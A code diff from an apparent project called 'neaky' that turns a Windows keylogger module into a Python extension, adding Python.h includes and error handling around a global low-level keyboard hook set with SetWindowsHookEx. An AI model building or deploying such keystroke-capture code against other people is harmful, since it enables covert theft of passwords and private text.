@@ -1,6 +1,5 @@
 #define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
 // Windows 头文件
-#define UNICODE
 #include <windows.h>
 #include <cstdio>
 #include <iostream>
@@ -9,6 +8,10 @@
 
 #include <neaky/utils.h>
 #include "keylog.h"
+
+#define PY_SSIZE_T_CLEAN
+#include <Python.h>
+#include "../neakymodule.h"
 
 HHOOK _hook;
 
@@ -31,16 +34,18 @@ static LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-static void KeyLoggerInit(std::ostream* os)
+static BOOL KeyLoggerInit(std::ostream* os)
 {
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
-		ErrorExit(L"Failed to install hook!");
+		PyErr_SetString(NeakyError, "Failed to install hook!");
+		return FALSE;
 	}
 
 	// outStream.open("KeyLog.txt", std::ios_base::app);
 	//outStream = new std::ostream(std::cout.rdbuf());
 	outStream = os;
+	return TRUE;
 }
 
 static void KeyLoggerFini()
